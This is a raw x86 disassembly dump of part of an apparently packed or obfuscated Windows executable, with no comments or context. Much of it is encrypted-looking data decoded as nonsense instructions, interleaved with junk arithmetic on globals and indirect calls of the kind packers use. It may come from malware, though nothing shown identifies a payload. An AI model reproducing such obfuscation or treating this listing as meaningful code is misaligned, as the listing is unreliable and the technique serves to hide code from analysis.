  40b24c:	bound  esp,QWORD PTR [ecx-0x45]
  40b24f:	cli    
  40b250:	jbe    0x40b2b1
  40b252:	push   eax
  40b253:	mov    al,0xd9
  40b255:	mov    ebx,0x76e97e10
  40b25a:	cmp    eax,0x512cf626
  40b25f:	inc    edi
  40b260:	sbb    DWORD PTR ds:0x8bc787e8,esi
  40b266:	inc    ecx
  40b267:	popa   
  40b268:	jo     0x40b203
  40b26a:	xchg   DWORD PTR [edi],ebp
  40b26c:	dec    esp
  40b26d:	dec    eax
  40b26e:	imul   ebx,DWORD PTR [esi-0x44452189],0x1e617f5e
  40b278:	push   ebx
  40b279:	daa    
  40b27a:	rcl    BYTE PTR [ebx+0x11491dbc],0x5
  40b281:	push   esp
  40b282:	jmp    0x40b2ed
  40b284:	mov    ds:0xbf56e1d5,eax
  40b289:	dec    ebp
  40b28a:	add    BYTE PTR [ecx],cl
  40b28c:	sbb    cl,BYTE PTR [ebx+0x3348c8fa]
  40b292:	or     BYTE PTR [ecx-0x7a61d8ff],dl
  40b298:	fs mov ebp,0xc8dfdce2
  40b29e:	xchg   edi,eax
  40b29f:	push   ds
  40b2a0:	setne  BYTE PTR [eax+0x71]
  40b2a4:	push   0xffffffe2
  40b2a6:	shr    BYTE PTR [edi-0x77],1
  40b2a9:	or     edx,DWORD PTR [esi-0x4de0fa15]
  40b2af:	sbb    DWORD PTR [ebx-0x1d],esp
  40b2b2:	jno    0x40b28f
  40b2b4:	pop    esp
  40b2b5:	out    0x8b,eax
  40b2b7:	popa   
  40b2b8:	in     eax,0x3f
  40b2ba:	xor    dh,BYTE PTR [edi]
  40b2bc:	push   ds
  40b2bd:	dec    esp
  40b2be:	push   ecx
  40b2bf:	and    ebx,esi
  40b2c1:	cmp    edi,edx
  40b2c3:	add    al,0xd4
  40b2c5:	jnp    0x40b251
  40b2c7:	mov    al,ds:0x81cabafe
  40b2cc:	in     al,0x68
  40b2ce:	(bad)  
  40b2cf:	(bad)  
  40b2d0:	push   edi
  40b2d1:	sbb    bh,bl
  40b2d3:	rol    BYTE PTR [ecx-0x1e],1
  40b2d6:	mov    edx,DWORD PTR [esi]
  40b2d8:	mov    edi,0x4ed9cb4f
  40b2dd:	and    cl,BYTE PTR [esi-0x6c6a33ce]
  40b2e3:	sahf   
  40b2e4:	sbb    esp,esp
  40b2e6:	ins    DWORD PTR es:[edi],dx
  40b2e7:	sub    DWORD PTR [esp+eax*4],esi
  40b2ea:	iret   
  40b2eb:	(bad)  
  40b2ec:	fs iret 
  40b2ee:	fs ret 0xdb60
  40b2f2:	add    dh,bl
  40b2f4:	fistp  WORD PTR [eax]
  40b2f6:	call   0x78ff4ba5
  40b2fb:	bound  esp,QWORD PTR [eax]
  40b2fd:	ds mov ch,0xd6
  40b300:	mov    ebx,DWORD PTR [ebx-0x43]
  40b303:	mov    ecx,0xfb358124
  40b308:	sub    al,0xc3
  40b30a:	repz jne 0x40b2b5
  40b30d:	dec    eax
  40b30e:	cwde   
  40b30f:	push   eax
  40b310:	and    BYTE PTR [edx-0x40],bl
  40b313:	push   ebx
  40b314:	push   eax
  40b315:	adc    DWORD PTR ds:0x42833b,0x4282f3
  40b31f:	call   0x416c20
  40b324:	sbb    esi,DWORD PTR ds:0x4282e7
  40b32a:	mov    ecx,DWORD PTR [ebp-0x20]
  40b32d:	adc    esi,0x2986
  40b333:	mov    esi,DWORD PTR [ebp-0x1c]
  40b336:	sbb    DWORD PTR ds:0x42827b,0x42833b
  40b340:	push   0x5f43
  40b345:	or     edx,0x69b4
  40b34b:	sub    DWORD PTR ds:0x4283d3,0x42833b
  40b355:	push   0x1657
  40b35a:	xor    DWORD PTR ds:0x4283bb,0x4282af
  40b364:	or     eax,0x528b
  40b369:	xor    edx,esi
  40b36b:	xor    eax,ecx
  40b36d:	sub    DWORD PTR ds:0x4283ef,0x42828f
  40b377:	push   edx
  40b378:	push   eax
  40b379:	call   0x416c20
  40b37e:	xor    ecx,ecx
  40b380:	or     ecx,DWORD PTR ds:0x4282ef
  40b386:	adc    DWORD PTR ds:0x4281e3,ecx
  40b38c:	mov    ecx,DWORD PTR [ebp-0x28]
  40b38f:	xor    DWORD PTR ds:0x428357,ecx
  40b395:	mov    esi,DWORD PTR [ebp-0x24]
  40b398:	and    DWORD PTR ds:0x4282c3,0x4282af
  40b3a2:	push   esi
  40b3a3:	add    DWORD PTR ds:0x4281bb,0x5412
  40b3ad:	push   ecx
  40b3ae:	sub    DWORD PTR ds:0x4283d7,0x27f7
  40b3b8:	push   edx
  40b3b9:	push   eax
  40b3ba:	sub    DWORD PTR ds:0x4281b7,0x4283eb
  40b3c4:	call   0x4220b4
  40b3c9:	mov    DWORD PTR [ebp-0x30],eax
  40b3cc:	add    eax,DWORD PTR ds:0x4282bb
  40b3d2:	mov    DWORD PTR [ebp-0x2c],edx
  40b3d5:	cmp    DWORD PTR ds:0x4282eb,0x0
  40b3dc:	not    esi
  40b3de:	mov    DWORD PTR ds:0x4282d3,0x6e42
  40b3e8:	jmp    0x40b4a9
  40b3ed:	not    DWORD PTR ds:0x42836b
  40b3f3:	mov    eax,ds:0x4282e3
  40b3f8:	cmp    DWORD PTR ds:0x4282eb,0x0
  40b3ff:	jl     0x40b428
  40b405:	push   0x2496
  40b40a:	push   DWORD PTR [ebp-0x28]
  40b40d:	call   DWORD PTR ds:0x428f2c
  40b413:	xor    edx,ecx
  40b415:	and    DWORD PTR ds:0x4281db,edx
  40b41b:	movzx  ecx,WORD PTR ds:0x4282cb
  40b422:	or     DWORD PTR ds:0x42835b,ecx
  40b428:	add    esi,edx
  40b42a:	adc    DWORD PTR ds:0x4281b7,0x1bfc
  40b434:	sub    esi,0x4a2f
  40b43a:	cmp    DWORD PTR ds:0x4283e3,0x0
  40b441:	mov    DWORD PTR ds:0x42835b,ecx
  40b447:	mov    DWORD PTR ds:0x4283db,0x318c
  40b451:	mov    DWORD PTR ds:0x4283eb,0x431a
  40b45b:	jmp    0x40b4a9
  40b460:	mov    DWORD PTR ds:0x4282b3,0x461b
  40b46a:	mov    DWORD PTR ds:0x4282ef,0x63d9
  40b474:	cmp    DWORD PTR ds:0x4283e3,0x0
  40b47b:	jbe    0x40b49b
  40b481:	push   DWORD PTR [ebp-0x1c]
  40b484:	push   0x184b
  40b489:	call   DWORD PTR ds:0x428f30
  40b48f:	xor    edx,DWORD PTR ds:0x4282c3
  40b495:	adc    ecx,DWORD PTR ds:0x4283cb
  40b49b:	and    DWORD PTR ds:0x4281bb,0x404c
  40b4a5:	and    edx,esi
  40b4a7:	add    ecx,edx
  40b4a9:	mov    DWORD PTR [ebp-0x10],0x5fa8
  40b4b0:	movzx  eax,WORD PTR ds:0x4282cf
  40b4b7:	xor    DWORD PTR ds:0x4283e3,eax
  40b4bd:	mov    DWORD PTR [ebp-0xc],0x1751
  40b4c4:	dec    DWORD PTR ds:0x4282b3
  40b4ca:	mov    DWORD PTR [ebp-0x20],0x5e90
  40b4d1:	mov    DWORD PTR [ebp-0x1c],0xfc1
  40b4d8:	cmp    DWORD PTR ds:0x4281cf,0x0
  40b4df:	mov    edx,0x29d6
  40b4e4:	mov    ecx,0x5377
  40b4e9:	not    esi
  40b4eb:	movzx  ecx,BYTE PTR ds:0x4281ab
  40b4f2:	jmp    0x40b54e
  40b4f7:	mov    DWORD PTR ds:0x42827b,0x9f5
  40b501:	mov    DWORD PTR ds:0x4282f7,0x1c35
  40b50b:	cmp    DWORD PTR ds:0x4281cf,0x0
  40b512:	je     0x40b542
  40b518:	push   0x428023
  40b51d:	push   0x400000
  40b522:	call   DWORD PTR ds:0x428e18
  40b528:	sbb    DWORD PTR ds:0x4282e7,edi
  40b52e:	mov    ecx,DWORD PTR ds:0x42821f
  40b534:	xor    edx,edx
  40b536:	or     edx,DWORD PTR ds:0x42840b
  40b53c:	sub    ecx,edx
  40b53e:	imul   ecx,DWORD PTR [ecx+edx*1]
  40b542:	and    esi,DWORD PTR ds:0x4281eb
  40b548:	sbb    esi,0x2386
  40b54e:	mov    DWORD PTR [ebp-0x28],0x7044
  40b555:	mov    DWORD PTR [ebp-0x24],0x7bf
  40b55c:	mov    eax,DWORD PTR [ebp-0x28]
  40b55f:	sbb    edx,DWORD PTR ds:0x428293
  40b565:	mov    ecx,DWORD PTR [ebp-0x24]
  40b568:	not    DWORD PTR ds:0x4282c3
  40b56e:	mov    edx,DWORD PTR [ebp-0x20]
  40b571:	or     DWORD PTR ds:0x4282f3,ecx
  40b577:	mov    esi,DWORD PTR [ebp-0x1c]
  40b57a:	sbb    DWORD PTR ds:0x4283cb,0x428293
  40b584:	jmp    0x40b97a
  40b589:	adc    DWORD PTR [edx+0x10],esi
  40b58c:	packssdw mm5,QWORD PTR [edx+0xf]
  40b590:	jb     0x40b5e9
  40b592:	jnp    0x40b598
  40b594:	push   0xffffffa6
  40b596:	ror    DWORD PTR [eax],1
  40b598:	push   0xa
  40b59a:	adc    ebx,DWORD PTR [eax]
  40b59c:	sbb    BYTE PTR [esi+0x12],ch
  40b59f:	sbb    BYTE PTR [eax],bl
  40b5a1:	xchg   DWORD PTR [eax],eax
  40b5a3:	int    0x28
  40b5a5:	in     eax,0x41
  40b5a7:	xchg   BYTE PTR [ecx-0x1929c76b],al
  40b5ad:	pusha  
  40b5ae:	cmp    al,0x9a
  40b5b0:	fld    QWORD PTR [edx]
  40b5b2:	inc    ecx
  40b5b3:	xchg   BYTE PTR [ebx-0x3c05f987],ch
  40b5b9:	retf   
  40b5ba:	xchg   esp,eax
  40b5bb:	nop
  40b5bc:	test   DWORD PTR [eax-0x2a],esi
  40b5bf:	sti    
  40b5c0:	jl     0x40b5bd
  40b5c2:	jbe    0x40b637
  40b5c4:	fdiv   QWORD PTR [edi]
  40b5c6:	cwde   
  40b5c7:	mov    eax,ds:0x1ebfff0d
  40b5cc:	xchg   edi,eax
  40b5cd:	sbb    eax,0xe1011ab8
  40b5d2:	stos   BYTE PTR es:[edi],al
  40b5d3:	sbb    BYTE PTR [esi+eax*2],0x17
  40b5d7:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b5d9:	inc    ecx
  40b5da:	xor    BYTE PTR [eax-0x4b],bl
  40b5dd:	test   DWORD PTR [esp+esi*8-0x60436441],eax
  40b5e4:	ds inc ebp
  40b5e6:	in     eax,0x77
  40b5e8:	inc    eax
  40b5e9:	or     esp,DWORD PTR [edi]
  40b5eb:	aas    
  40b5ec:	inc    esp
  40b5ed:	shr    BYTE PTR [edi+edi*4+0x42126e99],0x49
  40b5f5:	shr    BYTE PTR [ebx],cl
  40b5f7:	xor    edi,esp
  40b5f9:	clc    
  40b5fa:	mov    ebp,0x330bef31
  40b5ff:	and    BYTE PTR [ebp-0x495076ac],bl
  40b605:	jle    0x40b617
  40b607:	aaa    
  40b608:	mov    cl,BYTE PTR [esp+esi*1-0xf]
  40b60c:	mov    ds:0xb4a75294,eax
  40b611:	jl     0x40b5d7
  40b613:	dec    edi
  40b614:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b615:	xlat   BYTE PTR ds:[ebx]
  40b616:	add    dh,BYTE PTR [ebx+ecx*8+0x4a3b9559]
  40b61d:	jle    0x40b61d
  40b61f:	sub    esi,DWORD PTR [ebx+0x6d]
  40b622:	inc    ecx
  40b623:	add    BYTE PTR fs:[esp],0x8a
  40b628:	inc    edx
  40b629:	mov    dl,0x4f
  40b62b:	jnp    0x40b683
  40b62d:	out    0x4c,al
  40b62f:	cmp    DWORD PTR [edi+0xe55127c],ebx
  40b635:	retf   0x825c
  40b638:	pop    esi
  40b639:	icebp  
  40b63a:	mov    dl,0x59
  40b63c:	test   eax,0x4a05a99d
  40b641:	jnp    0x40b5cf
  40b643:	(bad)  
  40b644:	fldl2t 
  40b646:	or     BYTE PTR [edx+esi*2+0x17],bh
  40b64a:	push   0x86df018b
  40b64f:	push   ds
  40b650:	fsubr  DWORD PTR [ecx]
  40b652:	aam    0xcc
  40b654:	test   esp,edx
  40b656:	push   ebx
  40b657:	add    ch,BYTE PTR [ecx]
  40b659:	test   BYTE PTR [esi-0xc8ad7aa],cl
  40b65f:	and    BYTE PTR [eax+0x12a433df],al
  40b665:	fnstsw WORD PTR [ebp+0x45]
  40b668:	jno    0x40b601
  40b66a:	push   edx
  40b66b:	add    eax,0xaa2b5d1d
  40b670:	(bad)  
  40b672:	aad    0x69
  40b674:	lds    ebx,FWORD PTR [esi]
  40b676:	std    
  40b677:	push   ebp
  40b678:	ficom  DWORD PTR [eax-0x5c]
  40b67b:	retf   
  40b67c:	ins    DWORD PTR es:[edi],dx
  40b67d:	xor    eax,DWORD PTR [ebp-0x33]
  40b680:	mov    dh,0xe9
  40b682:	sbb    al,0x23
  40b684:	and    al,0xd0
  40b686:	je     0x40b6f1
  40b688:	retf   
  40b689:	retf   0xfadc
  40b68c:	dec    ebx
  40b68d:	pusha  
  40b68e:	aam    0x98
  40b690:	sti    
  40b691:	sub    BYTE PTR [eax+0x37a5e4c7],al
  40b697:	sub    esi,edx
  40b699:	(bad)  
  40b69a:	(bad)
  40b69e:	push   0xa9537e5c
  40b6a3:	xchg   ebp,eax
  40b6a4:	pop    es
  40b6a5:	out    dx,al
  40b6a6:	and    DWORD PTR [edi+0x41],ecx
  40b6a9:	or     DWORD PTR [ebx-0x4137ab40],esi
  40b6af:	jns    0x40b64b
  40b6b1:	add    edx,DWORD PTR [edi+ecx*2+0x4efb8ae8]
  40b6b8:	icebp  
  40b6b9:	mov    ds:0xb872af65,eax
  40b6be:	stc    
  40b6bf:	lds    eax,FWORD PTR [edi+0x16]
  40b6c2:	mov    es,WORD PTR [eax-0x3682b102]
  40b6c8:	fwait
  40b6c9:	test   eax,0xe9fa58df
  40b6ce:	test   al,0xe0
  40b6d0:	je     0x40b697
  40b6d2:	fwait
  40b6d3:	jmp    0x32d9798c
  40b6d8:	xchg   ebx,eax
  40b6d9:	pop    esp
  40b6da:	dec    edx
  40b6db:	fisttp WORD PTR [ebx+ebx*2+0x7b]
  40b6df:	fisub  WORD PTR [ebx+0x40fd7d33]
  40b6e5:	xor    dl,BYTE PTR [edx+esi*8+0x1e2f7e14]
  40b6ec:	dec    esp
  40b6ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b6ee:	stos   BYTE PTR es:[edi],al
  40b6ef:	xor    BYTE PTR [esi-0xfedc4bc],cl
  40b6f5:	aad    0xcb
  40b6f7:	adc    cl,BYTE PTR [ebx+0x5376b38b]
  40b6fd:	fwait
  40b6fe:	mov    ch,0x64
  40b700:	mov    ecx,0x33163fa5
  40b705:	or     ebp,DWORD PTR [ecx]
  40b707:	ins    DWORD PTR es:[edi],dx
  40b708:	ja     0x40b703
  40b70a:	xor    BYTE PTR [edi-0x2e5746c2],ah
  40b710:	stos   DWORD PTR es:[edi],eax
  40b711:	gs ins BYTE PTR es:[edi],dx
  40b713:	adc    al,0x61
  40b715:	sub    DWORD PTR [esi-0x327e67a0],esp
  40b71b:	mov    BYTE PTR [esi+edi*2],cl
  40b71e:	or     eax,0x65720d3a
  40b723:	cmp    al,0xae
  40b725:	loop   0x40b6f6
  40b727:	lds    ecx,FWORD PTR [edx]
  40b729:	pop    ecx
  40b72a:	mov    bl,0x75
  40b72c:	inc    esi
  40b72d:	repz and eax,0x26bbb5da
  40b733:	jae    0x40b74e
  40b735:	rcl    DWORD PTR [ebp+0x3],1
  40b738:	(bad)  
  40b739:	out    dx,eax
  40b73a:	loopne 0x40b6c1
  40b73c:	and    eax,0x4e2d63b8
  40b741:	retf   
  40b742:	fwait
  40b743:	add    al,BYTE PTR ds:0xdefd7d72
  40b749:	dec    esi
  40b74a:	and    ah,cl
  40b74c:	jne    0x40b76d
  40b74e:	pop    edi
  40b74f:	test   DWORD PTR [edx+edi*1-0x2dd50f18],ecx
  40b756:	xor    ch,BYTE PTR [esp+edi*2-0x6d2c7407]
  40b75d:	popw   ds
  40b75f:	xor    BYTE PTR [ebp-0x30],ah
  40b762:	hlt    
  40b763:	adc    ah,dl
  40b765:	sub    eax,0x770d62af
  40b76a:	cs cli 
  40b76c:	rol    BYTE PTR [edx+0x7b638e70],1
  40b772:	pop    edx
  40b773:	pop    ebp
  40b774:	aas    
  40b775:	xor    ecx,DWORD PTR [eax+eiz*8+0x55aeed7f]
  40b77c:	pop    es
  40b77d:	cdq    
  40b77e:	sbb    esp,ebx
  40b780:	retf   
  40b781:	loope  0x40b7d1
  40b783:	and    ecx,eax
  40b785:	pop    ebp
  40b787:	test   DWORD PTR [edx+edx*2+0x4bda9da5],ecx
  40b78e:	push   0x623da9f
  40b793:	sbb    bl,BYTE PTR [ecx+0x3efc204c]
  40b799:	clc    
  40b79a:	or     edi,DWORD PTR [ecx-0x13]
  40b79d:	cld    
  40b79e:	pop    ecx
  40b79f:	xchg   ebp,eax
  40b7a0:	sbb    BYTE PTR [ebp-0x5edd77cf],0xd9
  40b7a7:	xchg   ecx,eax
  40b7a8:	(bad)  
  40b7a9:	jmp    DWORD PTR [esi+ebp*2-0x73]
  40b7ad:	pop    ds
  40b7ae:	push   edx
  40b7af:	mov    esp,0x43fb5e39
  40b7b4:	out    dx,al
  40b7b5:	mov    ecx,DWORD PTR [edx+0x137e2333]
  40b7bb:	or     edi,edi
  40b7bd:	test   BYTE PTR [eax+0x9],ch
  40b7c0:	loopne 0x40b801
  40b7c2:	cld    
  40b7c3:	xor    edx,eax
  40b7c5:	dec    esp
  40b7c6:	shr    DWORD PTR ds:0x8f30fffc,1
  40b7cc:	cmc    
  40b7cd:	cs gs mov al,0x32
  40b7d1:	xchg   ebp,eax
  40b7d3:	cdq    
  40b7d4:	mov    ecx,0xa49da6b2
  40b7d9:	mov    esp,0x712e3377
  40b7de:	inc    ebp
  40b7df:	popf   
  40b7e0:	pop    esi
  40b7e1:	addr16 fs pop eax
  40b7e4:	inc    ebx
  40b7e5:	and    ecx,DWORD PTR [edi]
  40b7e7:	scas   eax,DWORD PTR es:[edi]
  40b7e8:	fdiv   DWORD PTR [edx-0x4aeeb3da]
  40b7ee:	sbb    esi,edi
  40b7f0:	fcomip st,st(1)
  40b7f2:	cdq    
  40b7f3:	push   0xffffffd0
  40b7f5:	sti    
  40b7f6:	mov    cl,0xb6
  40b7f8:	gs ins BYTE PTR es:[edi],dx
  40b7fa:	inc    esi
  40b7fb:	fdiv   QWORD PTR [ecx-0x6fc91fd]
  40b801:	test   eax,0x6a7183ef
  40b806:	psrad  mm3,QWORD PTR fs:[eax+0x69]
  40b80b:	repnz in al,dx
  40b80d:	mov    ch,0xff
  40b80f:	in     al,0x9e
  40b811:	or     DWORD PTR [ecx-0x50],ebx
  40b814:	dec    ebx
  40b815:	fld    QWORD PTR [edi]
  40b817:	popa   
  40b818:	lock ror ecx,cl
  40b81b:	inc    esi
  40b81c:	inc    cx
  40b81e:	(bad)  
  40b820:	dec    ebx
  40b821:	sbb    al,0x16
  40b823:	xabort 0x53
  40b826:	push   ds
  40b827:	sar    BYTE PTR [ebp-0x25],0x11
  40b82b:	mov    edi,0xd97968be
  40b830:	cmp    al,BYTE PTR [ebx-0x560727b7]
  40b836:	into   
  40b837:	mov    esi,0x4ad1bff3
  40b83c:	std    
  40b83d:	dec    edi
  40b83e:	lahf   
  40b83f:	add    esp,edx
  40b841:	scas   al,BYTE PTR es:[edi]
  40b842:	inc    eax
  40b843:	int    0x36
  40b845:	add    ecx,DWORD PTR [ecx-0x7356a7d7]
  40b84b:	hlt    
  40b84c:	ss jge 0x40b86e
  40b84f:	jge    0x40b827
  40b851:	sbb    BYTE PTR [edx+0x46c6167a],0x7d
  40b858:	out    dx,eax
  40b859:	pop    edi
  40b85a:	inc    ebp
  40b85b:	adc    esp,DWORD PTR [esi]
  40b85d:	(bad)  
  40b85e:	into   
  40b85f:	mov    bh,0x58
  40b861:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b862:	xor    ebp,DWORD PTR [ecx-0x75a9fbdb]
  40b868:	sbb    bh,BYTE PTR [eax-0x48]
  40b86b:	mov    gs,WORD PTR [ebx+0x7aa1df5b]
  40b871:	add    eax,0x341300f5
  40b876:	inc    eax
  40b877:	aam    0x93
  40b879:	test   DWORD PTR ss:[edx+0x1],ebp
  40b87d:	push   esp
  40b87e:	rol    BYTE PTR [eax-0xd],1
  40b881:	or     ecx,eax
  40b883:	dec    edx
  40b884:	or     al,0xfd
  40b886:	pop    ebx
  40b887:	fidivr WORD PTR [ebp-0x25493e17]
  40b88d:	and    al,0xfa
  40b88f:	adc    eax,0x30867cca
  40b894:	int3   
  40b895:	inc    esp
  40b896:	jecxz  0x40b8e3
  40b898:	push   0x1d
  40b89a:	xchg   ebx,eax
  40b89b:	pop    ebx
  40b89c:	jle    0x40b86d
  40b89e:	inc    eax
  40b89f:	xchg   edi,eax
  40b8a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b8a1:	jno    0x40b8b8
  40b8a3:	dec    edi
  40b8a4:	sti    
  40b8a5:	add    eax,0xdc2f230a
  40b8aa:	or     BYTE PTR [edx],al
  40b8ac:	shl    ecx,0x9
  40b8af:	fild   QWORD PTR [ecx+esi*8+0x24]
  40b8b3:	ds ja  0x40b8a7
  40b8b6:	sbb    al,0x29
  40b8b8:	dec    ebp
  40b8b9:	add    ecx,esp
  40b8bb:	test   DWORD PTR [ebx-0x5b],ecx
  40b8be:	inc    ebx
  40b8bf:	push   edx
  40b8c0:	add    DWORD PTR [esi+0x6f],0xffffffc8
  40b8c4:	int    0x3f
  40b8c6:	dec    eax
  40b8c7:	push   es
  40b8c8:	cli    
  40b8c9:	mov    al,0xe1
  40b8cb:	pop    ds
  40b8cc:	out    0x9d,eax
  40b8ce:	push   es
  40b8cf:	sbb    ebp,eax
  40b8d1:	rol    BYTE PTR [ebx+ebx*8+0x6d8c8cbf],cl
  40b8d8:	cmp    BYTE PTR [bx+si],ch
  40b8db:	dec    ebp
  40b8dc:	xrelease xchg DWORD PTR [edx-0x2b],edx
  40b8e0:	stos   BYTE PTR es:[edi],al
  40b8e1:	inc    eax
  40b8e2:	sbb    DWORD PTR [edx+0x16],esi
  40b8e5:	mov    bl,0xe6
  40b8e7:	xchg   esp,eax
  40b8e8:	dec    ebp
  40b8e9:	mov    esp,0x57f1416e
  40b8ee:	lock test dh,0xc9
  40b8f2:	scas   eax,DWORD PTR es:[edi]
  40b8f3:	fwait
  40b8f4:	mov    ebx,0x520c2269
  40b8f9:	push   ebx
  40b8fa:	dec    esp
  40b8fb:	aam    0xe3
  40b8fd:	xlat   BYTE PTR ds:[ebx]
  40b8fe:	push   0x2520324d
  40b903:	call   0x1d0ca7a6
  40b908:	xor    ah,BYTE PTR [ecx]
  40b90a:	mov    eax,0x8e0f9fa6
  40b90f:	and    DWORD PTR [ebp-0x65],edx
  40b912:	xchg   BYTE PTR ds:0xfd632588,bl
  40b918:	mov    eax,ds:0xc8fd481d
  40b91d:	sahf   
  40b91e:	es fsubrp st(4),st
  40b921:	loop   0x40b98e
  40b923:	and    al,cl
  40b925:	mov    al,ds:0x4d145dbd
  40b92a:	push   esp
  40b92b:	iret   
  40b92c:	xchg   ebx,eax
  40b92d:	sub    edi,DWORD PTR [esi]
  40b92f:	daa    
  40b930:	mov    ah,0x5c
  40b932:	js     0x40b99e
  40b934:	daa    
  40b935:	cs xor dh,ch
  40b938:	and    BYTE PTR [ebp-0x69],0x3c
  40b93c:	lea    eax,[edx]
  40b93e:	xchg   BYTE PTR [edi],dl
  40b940:	dec    edi
  40b941:	sbb    bl,BYTE PTR [esi+0x19c5edc1]
  40b947:	cmp    dl,bl
  40b949:	mov    al,0x8a
  40b94b:	adc    eax,0x3fc4ec41
  40b950:	and    bh,BYTE PTR [edx+0x1870ea19]
  40b956:	sub    BYTE PTR [esi-0x3c40a193],dl
  40b95c:	repz fprem1 
  40b95f:	repnz retf 
  40b961:	inc    edi
  40b962:	push   es
  40b963:	adc    eax,0xe2d2641d
  40b968:	lods   eax,DWORD PTR ds:[esi]
  40b969:	jmp    0x9369d3ff
  40b96e:	lods   al,BYTE PTR ds:[esi]
  40b96f:	fisubr WORD PTR [esi]
  40b971:	adc    cl,BYTE PTR [ecx-0x10]
  40b974:	fs push edx
  40b976:	adc    esp,eax
  40b978:	xlat   BYTE PTR ds:[ebx]
  40b979:	and    al,0x5
  40b97b:	pop    esp
  40b97c:	xor    eax,0xd1810000
  40b981:	sbb    DWORD PTR [eax],ecx
  40b983:	add    BYTE PTR [eax],al
  40b985:	adc    DWORD PTR ds:0x428343,0xc1d
  40b98f:	or     eax,edx
  40b991:	mov    edx,DWORD PTR [ebp-0x10]
  40b994:	or     ecx,esi
  40b996:	and    esi,DWORD PTR ds:0x4282c7
  40b99c:	mov    esi,DWORD PTR [ebp-0xc]
  40b99f:	and    DWORD PTR ds:0x428357,0x1cd5
  40b9a9:	or     eax,edx
  40b9ab:	cmp    DWORD PTR ds:0x42835f,0x0
  40b9b2:	mov    edx,0xd4e
  40b9b7:	not    edx
  40b9b9:	mov    DWORD PTR ds:0x4282c7,0x1f80
  40b9c3:	jmp    0x40ba42
  40b9c8:	mov    DWORD PTR ds:0x42835f,0x2492
  40b9d2:	mov    DWORD PTR ds:0x4283ef,0xa5a
  40b9dc:	cmp    DWORD PTR ds:0x42835f,0x0
  40b9e3:	jbe    0x40ba20
  40b9e9:	push   DWORD PTR [ebp-0x1c]
  40b9ec:	push   0x148d
  40b9f1:	call   DWORD PTR ds:0x428e1c
  40b9f7:	adc    DWORD PTR ds:0x4283eb,0x175a
  40ba01:	not    edx
  40ba03:	movzx  edx,WORD PTR ds:0x428347
  40ba0a:	sub    edx,DWORD PTR ds:0x42835b
  40ba10:	mov    DWORD PTR ds:0x428347,edx
  40ba16:	adc    DWORD PTR ds:0x428343,0x62d2
  40ba20:	mov    edx,DWORD PTR ds:0x4281b7
  40ba26:	xor    DWORD PTR ds:0x4283e3,edx
  40ba2c:	or     DWORD PTR ds:0x42828f,0x5c0
  40ba36:	mov    edx,DWORD PTR ds:0x4282c7
  40ba3c:	or     DWORD PTR ds:0x428363,edx
  40ba42:	mov    edx,DWORD PTR [ebp-0x30]
  40ba45:	or     ecx,esi
  40ba47:	mov    esi,DWORD PTR [ebp-0x2c]
  40ba4a:	or     eax,0xf34
  40ba4f:	or     ecx,0x6c90
  40ba55:	cmp    edx,eax
  40ba57:	jne    0x40ba65
  40ba5d:	cmp    esi,ecx
  40ba5f:	je     0x40cc06
  40ba65:	mov    DWORD PTR [ebp-0x30],0x5ddc
  40ba6c:	mov    DWORD PTR [ebp-0x2c],0x7433
  40ba73:	mov    eax,DWORD PTR [ebp-0x30]
  40ba76:	mov    ecx,DWORD PTR [ebp-0x2c]
  40ba79:	xor    ecx,0xfffffd1f
  40ba7f:	xor    eax,0xffff9fff
  40ba84:	and    ecx,0x6e0
  40ba8a:	and    eax,0x6244
  40ba8f:	mov    DWORD PTR [ebp-0x10],eax
  40ba92:	jmp    0x40be88
  40ba97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba99:	test   al,0x41
  40ba9b:	test   al,0x3d
  40ba9d:	sbb    al,0x1c
  40ba9f:	fdiv   QWORD PTR [edx]
  40baa1:	mov    bl,0x7c
  40baa3:	jb     0x40bae5
  40baa5:	sub    DWORD PTR [edx+0x18180d60],ebp
  40baab:	outs   dx,BYTE PTR ds:[esi]
  40baac:	adc    bl,BYTE PTR [eax]
  40baae:	sbb    BYTE PTR [eax-0x41],bl
  40bab1:	dec    esi
  40bab2:	daa    
  40bab3:	dec    ebx
  40bab4:	xor    bl,cl
  40bab6:	xor    eax,0x41d40f7d
  40babb:	add    eax,0xea1fe44b
  40bac0:	std    
  40bac1:	or     eax,0x31b46230
  40bac6:	or     esi,eax
  40bac8:	and    edx,DWORD PTR [ecx+ecx*1-0x79]
  40bacc:	leave  
  40bacd:	mov    eax,ds:0x931626c0
  40bad2:	mov    eax,eax
  40bad4:	cmp    eax,0x4e51915
  40bad9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bada:	es pop esi
  40badc:	xor    ch,BYTE PTR [ecx+0x2a]
  40badf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bae0:	ss ins DWORD PTR es:[edi],dx
  40bae2:	call   0x1a0c:0x9b2e5462
  40bae9:	jmp    0xb6a2:0xd739dd83
  40baf0:	adc    BYTE PTR [edi+eax*1+0x476ce5c5],ch
  40baf7:	retf   0xc37e
  40bafa:	lods   eax,DWORD PTR ds:[esi]
  40bafb:	fiadd  DWORD PTR [ebp+0x27]
  40bafe:	cmp    eax,0x48aa3332
  40bb03:	ret    0x91cd
  40bb06:	push   0xd312904c
  40bb0b:	jae    0x40bac5
  40bb0d:	push   esi
  40bb0e:	push   0x39
  40bb10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb11:	push   ds
  40bb12:	cmc    
  40bb13:	jae    0x40ba9e
  40bb15:	xor    eax,0xed7abaa4
  40bb1a:	sub    al,0x7f
  40bb1c:	icebp  
  40bb1d:	call   0x67f9:0x76be61e
  40bb24:	std    
  40bb25:	cmp    BYTE PTR [ebx+0x46],0xa9
  40bb29:	jne    0x40baf1
  40bb2b:	sub    edx,DWORD PTR [esi]
  40bb2d:	sbb    al,0x6d
  40bb2f:	les    esp,FWORD PTR [eax+ecx*4]
  40bb32:	retf   0x80af
  40bb35:	mov    ebp,0x32ef9bc7
  40bb3a:	or     BYTE PTR ss:[ecx+0x6a730fd1],cl
  40bb41:	push   0xfffffffd
  40bb43:	stos   BYTE PTR es:[edi],al
  40bb44:	int    0x50
  40bb46:	jge    0x40bb90
  40bb48:	pop    esi
